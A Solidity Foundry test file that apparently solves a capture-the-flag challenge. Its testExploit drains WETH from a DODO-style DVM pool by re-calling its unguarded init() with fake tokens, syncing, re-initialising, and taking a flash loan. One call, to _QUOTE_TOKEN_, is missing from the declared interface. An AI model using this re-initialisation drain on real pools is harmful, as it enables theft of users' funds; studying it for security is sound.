// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external;
}

contract Challenge {
    IERC20 private immutable WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address public immutable dvm;

    constructor(address dvm_) {
        dvm = dvm_;
    }

    function isSolved() external view returns (bool) {
        return WETH.balanceOf(dvm) == 0;
    }
}

interface DVMLike {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;
    function balanceOf(address) external view returns (uint256);
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
    function sync() external;
}

contract CounterTest is Test {
    Challenge public chall;
    DVMLike public dvm;
    IERC20 public WETH;
    IERC20 public QUOTE;

    FakeERC20 public fake;
    FakeERC20 public fake2;

    function setUp() public {
        chall = Challenge(address(0x7d10C97D09B5eF7037458515683e1a60862cC017));
        dvm = DVMLike(address(chall.dvm()));
        WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        QUOTE = IERC20(address(dvm._QUOTE_TOKEN_()));
        fake = new FakeERC20();
        fake2 = new FakeERC20();
    }

    function testExploit() public {
        // console.log(dvm.totalSupply()); // 100 ether
        dvm.init(address(this), address(fake2), address(fake), 0, address(0), 1, 1e18, false);
        dvm.sync();
        dvm.init(address(this), address(WETH), address(QUOTE), 0, address(0), 1, 1e18, false);
        dvm.flashLoan(100 ether, 500000 ether, address(this), hex"");
        chall.isSolved();
    }
}

contract FakeERC20 {
    function balanceOf(address) external returns (uint256) {
        return 0;
    }

    function decimals() external returns (uint256) {}
}